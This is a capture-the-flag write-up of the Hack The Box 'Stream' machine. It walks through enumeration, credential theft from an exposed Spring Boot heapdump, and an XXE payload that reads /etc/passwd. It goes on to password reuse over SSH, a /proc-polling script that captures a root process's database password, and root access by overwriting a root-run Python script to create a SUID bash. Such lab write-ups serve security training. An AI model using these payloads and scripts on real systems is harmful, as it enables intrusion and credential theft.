@@ -1,0 +1,912 @@
+---
+layout: post
+title: "Hack The Box - Stream Writeup"
+date: 2026-11-19
+categories:
+  - writeups
+  - htb
+platform: htb
+level: medium
+points: 845
+tags:
+  - hack-the-box
+  - spring-boot
+  - heap-dump
+  - clickhouse
+  - xxe
+  - hack-the-box
+  - htb
+  - stream
+  - ctf
+  - ctf-writeup
+  - hack-the-box-writeup
+  - penetration-testing
+  - pentesting
+  - cybersecurity
+  - ethical-hacking
+  - offensive-security
+  - red-team
+  - web-security
+  - web-application-security
+  - application-security
+  - security-research
+  - vulnerability-assessment
+  - reconnaissance
+  - enumeration
+  - virtual-host-enumeration
+  - vhost-enumeration
+  - subdomain-enumeration
+  - information-disclosure
+  - sensitive-information-disclosure
+  - spring
+  - spring-boot
+  - spring-boot-actuator
+  - actuator
+  - actuator-endpoints
+  - exposed-endpoints
+  - heap-dump
+  - heapdump-analysis
+  - memory-analysis
+  - java
+  - jvm
+  - clickhouse
+  - database-security
+  - database-enumeration
+  - xml
+  - xml-security
+  - xml-external-entity
+  - xxe-injection
+  - local-file-inclusion
+  - local-file-read
+  - file-disclosure
+  - linux
+  - linux-security
+  - privilege-escalation
+  - system-enumeration
+  - technical-writeup
+  - hacking-labs
+  - infosec
+  - infosec-community
+---
+
+![Image]({{ site.baseurl }}/images/stream/1.png)
+
+**Strean** is a Hack the Box Meduim box in this step-by-step walk-through we'll solve it together.
+
+**box Link:** [Stream](https://app.hackthebox.com/machines/Stream)
+
+# RECON :
+As always i start enumarating the box with nmap to see the open ports , including the version of the services 
+
+**Nmap output:**
+
+````bash
+map -sCV -vv --top-ports 10000 10.129.213.61 --reason -oN scan.nmap
+
+Scanning 10.129.213.61 [8387 ports]
+Discovered open port 22/tcp on 10.129.213.61
+Discovered open port 80/tcp on 10.129.213.61
+Discovered open port 8081/tcp on 10.129.213.61
+
+
+Scanning 3 services on 10.129.213.61
+
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
+|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
+80/tcp   open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://api.htb-airport.htb/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+8081/tcp open  http    syn-ack ttl 63 Uvicorn
+|_http-title: Site doesn't have a title (application/json).
+| http-methods: 
+|_  Supported Methods: GET
+|_http-server-header: uvicorn
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+````
+
+# Initial Enumeration
+
+Port 80 reveals a possible virtual host:
+
+`api.htb-airport.htb`
+
+Let's add it to our `/etc/hosts` file:
+
+```bash
+echo "$IP api.htb-airport.htb" | sudo tee -a /etc/hosts
+```
+
+**Port 80:**
+
+![Port 80]({{ site.baseurl }}/images/stream/2.png)
+
+**Port 8081:**
+
+![Port 8081]({{ site.baseurl }}/images/stream/3.png)
+
+Since the hostname we discovered contains the `api` subdomain, it is worth checking whether other virtual hosts exist under the same parent domain.
+
+We can use `ffuf` to fuzz the `Host` header:
+
+```bash
+ffuf -u http://$IP/ \
+  -w /path/to/wordlist.txt \
+  -H "Host: FUZZ.htb-airport.htb" \
+  -fw 6
+```
+
+The `-fw 6` option filters out responses containing six words. This helps remove the default response returned for unknown virtual hosts.
+
+The scan reveals two valid hostnames:
+
+```text
+api    [Status: 200, Size: 361, Words: 9, Lines: 1]
+db     [Status: 200, Size: 4, Words: 1, Lines: 2]
+```
+
+Let's add the discovered hostnames to `/etc/hosts`:
+
+```bash
+echo "$IP htb-airport.htb api.htb-airport.htb db.htb-airport.htb" \
+  | sudo tee -a /etc/hosts
+```
+
+# Exploring the API and ClickHouse
+
+The `db.htb-airport.htb` hostname appears to expose a ClickHouse instance.
+
+**ClickHouse** is an open-source, column-oriented database management system designed for high-performance analytical queries (OLAP). It is commonly used to process and analyze large volumes of data.
+
+![ClickHouse]({{ site.baseurl }}/images/stream/4.png)
+
+![ClickHouse interface]({{ site.baseurl }}/images/stream/4-1.png)
+
+On the API side, the application expects requests with the `application/xml` content type.
+
+![API request]({{ site.baseurl }}/images/stream/4-2.png)
+
+I started by sending a basic XML request. The response indicated that the application expected several AIDX elements:
+
+```text
+IATA_AIDX_FlightLegNotifRQ
+Originator
+FlightLeg
+LegIdentifier
+```
+
+![Initial XML request]({{ site.baseurl }}/images/stream/4-3.png)
+
+![AIDX response]({{ site.baseurl }}/images/stream/4-4.png)
+
+A quick search revealed that **AIDX** stands for *Aviation Information Data Exchange*. It is an XML-based messaging standard used by the aviation industry to exchange operational flight information between airlines and airport systems.
+
+Whenever I encounter an application that processes XML, I check whether it is vulnerable to **XML External Entity (XXE)** attacks.
+
+At this point, however, I did not yet have a reliable way to confirm whether entity expansion was taking place. The API response did not expose the processed XML data, so I decided to investigate the other services first.
+
+# Enumerating the API
+
+Let's return to the API and enumerate its available endpoints.
+
+```bash
+gobuster dir \
+  -u http://api.htb-airport.htb \
+  -w /opt/seclists/Discovery/Web-Content/big.txt
+```
+
+The scan discovers two interesting endpoints:
+
+```text
+health    (Status: 200) [Size: 15]
+status    (Status: 200) [Size: 361]
+```
+
+![Gobuster results]({{ site.baseurl }}/images/stream/5.png)
+
+I also tried another wordlist, `quickhits.txt`, which revealed something more interesting:
+
+```bash
+gobuster dir \
+  -u http://api.htb-airport.htb \
+  -w /opt/seclists/Discovery/Web-Content/quickhits.txt
+```
+
+```text
+actuator    (Status: 200) [Size: 169]
+```
+
+![Actuator endpoint]({{ site.baseurl }}/images/stream/6.png)
+
+An exposed Actuator endpoint is worth investigating. In Java applications, Spring Boot Actuator can expose operational information and management endpoints. Some configurations may also expose sensitive information.
+
+One particularly interesting endpoint is `/actuator/heapdump`.
+
+A heap dump is a snapshot of the JVM heap memory. It can contain objects and data currently held in memory, potentially including credentials, database connection details, tokens, and other sensitive configuration values.
+
+Let's download it:
+
+```bash
+curl -sS http://api.htb-airport.htb/actuator/heapdump \
+  -o heapdump.bin
+```
+
+![Heap dump]({{ site.baseurl }}/images/stream/7.png)
+
+The file is a binary memory snapshot, so it is not particularly readable in its original form. We can use `strings` to extract printable strings and make the contents easier to inspect:
+
+```bash
+strings heapdump.bin > heapdump.txt
+```
+
+Now let's search for potentially interesting values:
+
+```bash
+grep -iEn "pass|user|salt|clickhouse|hash" heapdump.txt
+```
+
+Among the results, I found what appeared to be a user record:
+
+```text
+User: SVC_EVENTS
+Hash: d46816e16a3bef21a34bc659b045baff42f17a102add9ff9120396778ab97966
+Salt: b590f771ecf7332e
+```
+
+While browsing the extracted strings, I also found a possible plaintext password:
+
+```text
+Yl4aCgh4y2PnU
+```
+
+# Accessing ClickHouse
+
+After rebooting the target, its IP address changed from `10.129.215.0` to `10.129.215.27`. I updated my `$IP` variable accordingly.
+
+I then tested the recovered credentials against the ClickHouse service.
+
+```bash
+curl -sS --user 'svc_events:Yl4aCgh4y2PnU' -G \
+  'http://db.htb-airport.htb/' \
+  --data-urlencode "query=SELECT currentUser()"
+```
+
+The response confirmed that the credentials were valid:
+
+```text
+svc_events
+```
+
+Now we can enumerate the database.
+
+**List databases:**
+
+```bash
+curl -sS --user 'svc_events:Yl4aCgh4y2PnU' -G \
+  'http://db.htb-airport.htb/' \
+  --data-urlencode "query=SHOW DATABASES"
+```
+
+Output:
+
+```text
+partner_feed
+```
+
+**List tables:**
+
+```bash
+curl -sS --user 'svc_events:Yl4aCgh4y2PnU' -G \
+  'http://db.htb-airport.htb/' \
+  --data-urlencode "query=SHOW TABLES FROM partner_feed"
+```
+
+Output:
+
+```text
+flightleg_json
+flightleg_json_kafka
+flightleg_json_mv
+flightleg_raw
+flightleg_raw_kafka
+flightleg_raw_mv
+```
+
+You can also access the ClickHouse web interface at:
+
+`http://db.htb-airport.htb/play`
+
+Credentials:
+
+```text
+svc_events:Yl4aCgh4y2PnU
+```
+
+![ClickHouse login]({{ site.baseurl }}/images/stream/10.png)
+
+![ClickHouse interface]({{ site.baseurl }}/images/stream/12.png)
+
+# Investigating the XML Processing Pipeline
+
+Now that we have database access, we can inspect the tables to understand how the application processes the XML requests we submitted earlier.
+
+The `flightleg_json` table looks particularly interesting because it contains the parsed representation of the incoming flight-leg messages.
+
+Let's query it:
+
+```bash
+curl -sS --user 'svc_events:Yl4aCgh4y2PnU' -G \
+  'http://db.htb-airport.htb/' \
+  --data-urlencode "query=SELECT * FROM partner_feed.flightleg_json"
+```
+
+The output contains a JSON representation of the AIDX message:
+
+```json
+{
+  "message_type": "IATA_AIDX_FlightLegNotifRQ",
+  "version": null,
+  "timestamp": null,
+  "transaction_id": null,
+  "originator": null,
+  "leg": {
+    "ufi": {
+      "airline": null,
+      "flight_number": null,
+      "suffix": null,
+      "departure_airport": null,
+      "arrival_airport": null,
+      "origin_date": null,
+      "repeat_number": null
+    },
+    "operational_status": null,
+    "times": {},
+    "all_fields": {
+      "LegIdentifier": null
+    }
+  }
+}
+```
+
+![Parsed flight-leg data]({{ site.baseurl }}/images/stream/13.png)
+
+This is useful: we can now inspect the parsed output instead of relying solely on the API response.
+
+Since the application processes XML and stores the parsed result in ClickHouse, we can use this table to check whether XML entities are expanded.
+
+# Testing for XXE
+
+I started by testing an internal XML entity. This helps establish whether the XML parser processes entity declarations and expands references.
+
+After confirming internal entity expansion, I moved on to an external entity referencing a local file.
+
+The following is the structure of the external entity test:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<IATA_AIDX_FlightLegNotifRQ
+    Version="22.1"
+    TimeStamp="2026-11-21T14:30:00Z"
+    TransactionIdentifier="xxe-test-001"
+    TransactionStatusCode="Update">
+
+  <Originator CompanyShortName="TEST"
+              TravelSector="A"
+              Code="TEST"
+              CodeContext="3"/>
+
+  <FlightLeg>
+    <LegIdentifier>
+      <Airline CodeContext="3">ZZ</Airline>
+      <FlightNumber>123</FlightNumber>
+      <DepartureAirport CodeContext="3">LHR</DepartureAirport>
+      <ArrivalAirport CodeContext="3">JFK</ArrivalAirport>
+      <OriginDate>2026-11-21</OriginDate>
+      <RepeatNumber CurrentInd="true">1</RepeatNumber>
+    </LegIdentifier>
+
+    <LegData>
+      <RemarkFreeText>&xxe;</RemarkFreeText>
+    </LegData>
+  </FlightLeg>
+</IATA_AIDX_FlightLegNotifRQ>
+```
+
+![XXE test request]({{ site.baseurl }}/images/stream/14.png)
+
+The important part is not simply whether the API accepts the request. An accepted response only confirms that the message was received. We need to inspect the parsed record in ClickHouse and check whether the referenced file contents appear in the output.
+
+For example, query the record using its transaction identifier:
+
+```bash
+curl -sS --user 'svc_events:Yl4aCgh4y2PnU' -G \
+  'http://db.htb-airport.htb/' \
+  --data-urlencode "query=SELECT transaction_id,event FROM partner_feed.flightleg_json WHERE transaction_id='xxe-test-001'"
+```
+
+![Parsed XXE result]({{ site.baseurl }}/images/stream/15.png)
+
+The parsed output is where we can verify whether the external entity was resolved. If the contents of `/etc/passwd` appear in the stored result, that confirms XXE-based local file disclosure.
+
+This is different from merely confirming internal entity expansion: an internal entity can be expanded without the parser being allowed to access external resources.
+
+# Finding the Kafka Configuration
+
+With file disclosure confirmed, we can investigate the files used by the application's Kafka infrastructure.
+
+A few questions need answering:
+
+1. Which Kafka version is installed?
+2. Where is Kafka installed?
+3. Where is its `server.properties` configuration file?
+
+The configuration file is particularly interesting because it may reveal how Kafka authenticates clients, which listeners are enabled, and whether credentials are configured.
+
+I created a wordlist containing common installation paths and possible Kafka versions:
+
+```text
+/etc/kafka/server.properties
+/etc/kafka/kafka.properties
+/etc/kafka/broker.properties
+/usr/local/kafka/config/server.properties
+/usr/local/etc/kafka/server.properties
+/opt/kafka/config/server.properties
+/opt/kafka/config/kraft/server.properties
+/opt/kafka/server.properties
+/opt/apache-kafka/config/server.properties
+/opt/apache-kafka/server.properties
+/opt/kafka_2.12-*/config/server.properties
+/opt/kafka_2.13-*/config/server.properties
+/opt/kafka_2.12-3.0.0/config/server.properties
+/opt/kafka_2.12-3.5.0/config/server.properties
+/opt/kafka_2.13-3.6.0/config/server.properties
+/opt/kafka_2.13-3.7.0/config/server.properties
+/opt/kafka_2.13-3.8.0/config/server.properties
+/opt/kafka_2.13-4.0.0/config/server.properties
+/opt/kafka_2.13-4.1.0/config/server.properties
+/opt/kafka_2.13-4.2.0/config/server.properties
+/opt/kafka_2.13-4.3.0/config/server.properties
+/opt/kafka_2.13-4.3.1/config/server.properties
+/opt/kafka*/config/server.properties
+/etc/kafka/server.properties
+/usr/share/kafka/config/server.properties
+/usr/share/java/kafka/config/server.properties
+/usr/lib/kafka/config/server.properties
+/var/lib/kafka/config/server.properties
+/srv/kafka/config/server.properties
+/srv/kafka/server.properties
+/data/kafka/config/server.properties
+/data/kafka/server.properties
+/home/kafka/config/server.properties
+/home/kafka/server.properties
+/root/kafka/config/server.properties
+/root/kafka/server.properties
+/kafka/config/server.properties
+/opt/bitnami/kafka/config/server.properties
+/bitnami/kafka/config/server.properties
+/usr/local/bitnami/kafka/config/server.properties
+/app/kafka/config/server.properties
+/config/server.properties
+/etc/kafka/config/server.properties
+/mnt/kafka/config/server.properties
+/run/secrets/kafka/server.properties
+```
+
+**Note:** The wildcard entries are path patterns, not literal filesystem paths. They are useful when building a local search strategy, but a request for a literal path containing `*` will not automatically expand it on the target.
+
+I sent the candidate paths through Burp Suite Intruder and also tested automation with Caido.
+
+![Burp Intruder]({{ site.baseurl }}/images/stream/16.png)
+
+![Caido automation]({{ site.baseurl }}/images/stream/17.png)
+
+Eventually, I found the Kafka configuration file.
+
+![Kafka configuration file result]({{ site.baseurl }}/images/stream/18.png)
+
+# Recovering Kafka Credentials
+
+The configuration file contained the following authentication setting:
+
+```properties
+sasl.enabled.mechanisms=PLAIN
+
+listener.name.sasl_plaintext.plain.sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required \
+  user_svc_infra="Ny2hdpme$bwT3";
+
+authorizer.class.name=org.apache.kafka.metadata.authorizer.StandardAuthorizer
+allow.everyone.if.no.acl.found=true
+```
+
+This reveals a Kafka SASL/PLAIN user:
+
+```text
+Username: svc_infra
+Password: Ny2hdpme$bwT3
+```
+
+The `user_svc_infra` property defines the credentials for the `svc_infra` user in this Kafka listener's JAAS configuration.
+
+The `allow.everyone.if.no.acl.found=true` setting is also worth noting. It controls authorization behavior when no matching ACL is found. It does **not** disable authentication by itself.
+
+![Recovered Kafka credentials]({{ site.baseurl }}/images/stream/19.png)
+
+# SSH Access
+
+With the recovered credentials, I tried reusing the password for the `svc-infra` system account.
+
+```bash
+ssh svc-infra@$IP
+```
+
+After entering the recovered password, I successfully obtained an SSH session as `svc-infra`.
+
+```text 
+ssh svc-infra@IP
+
+password: Ny2hdpme$bwT3
+```
+![Image]({{ site.baseurl }}/images/stream/20.png)
+
+upload linpeas.sh and pspy on the box to see how can you we EP on the box . 
+
+open ports on the box : 
+![Image]({{ site.baseurl }}/images/stream/21.png)
+
+
+
+Systemd timers can execute services automatically at predefined intervals. They are worth inspecting because a scheduled service may run with privileges that the current user does not have.
+
+First, list all active and inactive timers:
+
+```bash
+systemctl list-timers --all
+```
+![Image]({{ site.baseurl }}/images/stream/22.png)
+
+Among the results, we find an interesting entry:
+
+```text
+aidx-dlq-drainer.timer  ->  aidx-dlq-drainer.service
+```
+
+The name suggests that this service handles messages from the AIDX Dead Letter Queue (DLQ).
+
+A Dead Letter Queue is commonly used to store messages that could not be processed successfully. These messages can be inspected or retried later.
+
+Let's inspect both the service and its timer:
+
+```bash
+systemctl cat aidx-dlq-drainer.service aidx-dlq-drainer.timer
+```
+![Image]({{ site.baseurl }}/images/stream/23.png)
+
+Interessting
+
+- `User=root`: the service executes with root privileges.
+- `ExecStart`: the service runs `/opt/ops/dlq_drainer.py` using Python 3.
+
+This gives us an interesting lead: if we can influence something that this script executes or processes, we may be able to affect a root-level operation.
+
+lets try to read what on that py script 
+
+```bash
+cat /opt/ops/dlq_drainer.py
+```
+
+Several important variables and functions stand out:
+
+```python
+DLQ_TOPIC   = "aidx.flightleg.dlq.v1"
+FORMATTER   = "/var/lib/clickhouse/user_files/aidx_quarantine.py"
+CH_PW_FILE  = "/etc/partner-sync/ch.pw"
+```
+
+Let's understand what each one represents:
+
+- `DLQ_TOPIC`: the Kafka topic from which the service consumes failed AIDX messages.
+- `FORMATTER`: a Python script used to format or process incoming messages.
+- `CH_PW_FILE`: a file containing the password used to authenticate to ClickHouse.
+
+The script retrieves the ClickHouse password through:
+
+```python
+def _pw():
+    with open(CH_PW_FILE) as fh:
+        return fh.read().strip()
+```
+
+It then executes the formatter:
+
+```python
+def _format(raw):
+    p = subprocess.run(
+        ["python3", FORMATTER],
+        input=raw,
+        capture_output=True,
+        check=False
+    )
+    ...
+```
+
+Notice that the formatter is executed directly through Python:
+
+```python
+python3 /var/lib/clickhouse/user_files/aidx_quarantine.py
+```
+
+Finally, the script connects to ClickHouse:
+
+```python
+def _record(...):
+    subprocess.run([
+        "clickhouse-client",
+        "--user", "default",
+        "--password", _pw(),
+        "-q", q
+    ], check=False)
+```
+
+This reveals an important detail: the ClickHouse password is passed as a command-line argument to `clickhouse-client`.
+
+We now have two interesting areas to investigate:
+
+1. The root service executes a Python formatter from ClickHouse's `user_files` directory.
+2. The service launches ClickHouse commands using a password supplied through the command line.
+
+tye password file isnot readable :
+
+```text
+-rw------- 1 root root 13 ... /etc/partner-sync/ch.pw
+```
+
+The permissions `600` mean that only the file owner, root, can read and write it.
+
+Next, clickHouse directory :
+
+```bash
+ls -l /var/lib/clickhouse
+```
+![Image]({{ site.baseurl }}/images/stream/24.png)
+
+Therefore, our `svc-infra` account cannot directly read the ClickHouse password file or access the formatter directory.
+
+However, we know that the root service can access both.
+
+let's try to use clickhouse from the box , with the creds we've found earlier 
+
+```text
+Username: svc_events
+Password: Yl4aCgh4y2PnU
+```
+
+
+```bash
+clickhouse-client --user svc_events --password 'Yl4aCgh4y2PnU' \
+    -q "SELECT currentUser(), version(); SHOW GRANTS;"
+```
+
+Output:
+
+```text
+svc_events  26.8.1.1746
+
+GRANT SELECT, INSERT ON partner_feed.* TO svc_events
+```
+
+This confirms that `svc_events` can read and insert records in the `partner_feed` database.
+
+But can it write files?
+
+Let's test the ClickHouse `file()` table function:
+
+```bash
+clickhouse-client --user svc_events --password 'Yl4aCgh4y2PnU' \
+    -q "INSERT INTO FUNCTION file('test.txt') SELECT 'test'"
+```
+
+The operation fails:
+
+```text
+Code: 497
+Not enough privileges ...
+grant WRITE ON FILE
+```
+
+This tells us that `svc_events` does not have the `WRITE ON FILE` privilege.
+
+So, although these credentials are useful for database enumeration, they cannot be used to overwrite the formatter.
+
+We need to understand how the root service authenticates to ClickHouse.
+
+I first tried to monitor the process using **pspy**, but after some investigation, I discovered that it was too slow to reliably capture the short-lived `clickhouse-client` process.
+
+thats why i did it using py , the following script will capter the request and store them in :
+/tmp/mon.log 
+```bash
+import os
+import time
+
+LOG = "/tmp/mon.log"
+end = time.time() + 1200
+seen = set()
+
+while time.time() < end:
+    for pid in os.listdir("/proc"):
+        if not pid.isdigit() or pid in seen:
+            continue
+
+        try:
+            with open("/proc/%s/cmdline" % pid, "rb") as fh:
+                cmd = fh.read().replace(
+                    b"\x00", b" "
+                ).decode("utf-8", "replace").strip()
+        except OSError:
+            continue
+
+        if "clickhouse-client" in cmd:
+            seen.add(pid)
+
+            try:
+                uid = os.stat("/proc/%s" % pid).st_uid
+            except OSError:
+                uid = -1
+
+            with open(LOG, "a") as out:
+                out.write(
+                    "%s PID=%s UID=%s: %s\n" % (
+                        time.strftime("%H:%M:%S", time.gmtime()),
+                        pid,
+                        uid,
+                        cmd
+                    )
+                )
+
+    time.sleep(0.001)
+
+```
+
+The script performs the following operations:
+
+1. Enumerates running processes through `/proc`.
+2. Reads each process's command-line arguments.
+3. Looks for processes containing `clickhouse-client`.
+4. Records the PID, process owner UID, and command line.
+5. Avoids recording the same PID more than once.
+
+We give it a 20-minute monitoring window.
+
+Start it in the background:
+
+```bash
+nohup setsid python3 /tmp/mon.py >/dev/null 2>&1 &
+```
+# coffee break !
+
+![Image]({{ site.baseurl }}/images/meme/coffee.png)
+
+```bash
+cat /tmp/mon.log
+```
+
+We captured an entry similar to:
+
+```text
+18:24:10 PID=194340 UID=0: clickhouse-client --user default \
+--password N3v3rs33nD4T4 -q INSERT INTO aidx_ops.failed_ingest \
+(id, reason, byte_len, root_tag, preview, quarantine_path, received_at) \
+VALUES ('...', 'unknown', 12, 'UNKNOWN', 'dlq-flood-26', \
+'/var/lib/aidx/quarantine/...', now())
+```
+
+well well well : 
+
+```text
+Username: default
+Password: N3v3rs33nD4T4
+```
+
+This is the password read by the root drainer from `/etc/partner-sync/ch.pw`.
+
+lets' test those creds on clickhouse: 
+
+```bash
+clickhouse-client --user default --password 'N3v3rs33nD4T4' \
+    -q "SELECT currentUser(), version(); SHOW GRANTS;"
+```
+![Image]({{ site.baseurl }}/images/stream/25.png)
+
+The account has broad privileges, including the `FILE` privilege:
+
+
+This is the missing permission we needed.
+
+Unlike `svc_events`, the `default` account can use ClickHouse's file-writing functionality, subject to the configured file access restrictions.
+
+
+ClickHouse provides a table function called `file()` that allows queries to read from or write to files.
+
+However, file access is restricted by the configured `user_files_path`.
+
+In this environment, the relevant directory is:
+
+```text
+/var/lib/clickhouse/user_files/
+```
+
+Remember the formatter path we discovered earlier:
+
+```text
+/var/lib/clickhouse/user_files/aidx_quarantine.py
+```
+
+This is the important connection:
+
+- ClickHouse allows the `default` account to write files.
+- The formatter is stored inside ClickHouse's user files directory.
+- The root drainer executes that formatter using Python.
+- Therefore, replacing the formatter changes code that will subsequently be executed by the root service.
+.
+
+
+what we are to do ?
+
+- copy /bin/bash and gives it root SUID
+
+```python
+import os
+os.system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash")
+```
+
+We can write this Python code through ClickHouse:
+
+```bash
+clickhouse-client --user default --password 'N3v3rs33nD4T4' <<'SQL'
+INSERT INTO FUNCTION file('aidx_quarantine.py')
+SETTINGS engine_file_truncate_on_insert=1
+SELECT 'import os;os.system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash")'
+SQL
+```
+
+
+To verify the file contents:
+
+```bash
+clickhouse-client --user default --password 'N3v3rs33nD4T4' \
+    -q "SELECT * FROM file('aidx_quarantine.py')"
+```
+
+![Image]({{ site.baseurl }}/images/stream/26.png)
+
+## coffe break !
+
+![Image]({{ site.baseurl }}/images/meme/coffee.png)
+
+
+```text
+-rwsr-xr-x 1 root root ... /tmp/rootbash
+```
+![Image]({{ site.baseurl }}/images/stream/27.png) 
+
+Execute the copied Bash binary with the `-p` option will gives us our root shell :
+
+```bash
+/tmp/rootbash -p
+```
+![Image]({{ site.baseurl }}/images/stream/28.png)
+
+that's it guys , i hope we learn something along the way .
+
+![Image]({{ site.baseurl }}/images/cat.jpeg)
+
+
